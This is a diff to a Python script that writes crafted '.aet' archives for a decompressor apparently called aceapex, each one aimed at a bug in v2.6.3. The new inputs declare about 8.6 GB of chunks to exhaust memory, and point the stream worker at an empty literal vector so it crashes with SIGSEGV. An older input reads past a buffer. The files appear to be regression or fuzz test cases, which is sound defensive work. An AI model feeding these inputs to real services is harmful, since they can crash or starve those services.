@@ -33,3 +33,14 @@ open("v2_lit4zero.aet","wb").write(v2(1, 4096, 4096, (len(lit),0,0,len(CMD1)), b
 # region reads 120 bytes past the 8-byte window (the slices were not checked against the decoded streams)
 lit = struct.pack("<Q", 8) + struct.pack("<Q", 1<<63) + b"ACGTACGT"
 open("v2_litslice.aet","wb").write(v2(1, 4096, 4096, (len(lit),0,0,len(CMD1)), bo(0,0,0,0, 4096,0,0,1), lit + CMD1))
+
+# 2.6.4 step 4 - the streaming decoder of the default profile (aceapex_decompress_stream):
+LIT8 = struct.pack("<QQ", (1<<62)|(1<<61)|8, 4096) + struct.pack("<Q", 0)   # chunked literals, 8 B in one chunk (no body)
+# st_tokcap (#11): the command stream declares 64 chunks of 0x7FFF << 12 B (8.6 GB), 1 compressed byte each; block 0's
+# command slice is the whole declared stream: v2.6.3 decodes the chunks of the window, 128 MiB each, before any check
+cmd = struct.pack("<Q", (0x7FFF << 48) | S) + struct.pack("<64Q", *([1]*64)) + b"\0"*64
+open("st_tokcap.aet","wb").write(v2(1, 4096, 4096, (len(LIT8),0,0,len(cmd)), bo(0,0,0,0, 8,0,0,S), LIT8 + cmd))
+# st_lchempty: chunked literals of 0 bytes (no chunk in the table), block 0 with an empty literal slice: v2.6.3's
+# stream worker reads c.lch[0] of an empty vector (SIGSEGV)
+lit0 = struct.pack("<QQ", (1<<62)|(1<<61)|0, 4096)
+open("st_lchempty.aet","wb").write(v2(1, 4096, 4096, (len(lit0),0,0,len(CMD1)), bo(0,0,0,0, 0,0,0,1), lit0 + CMD1))
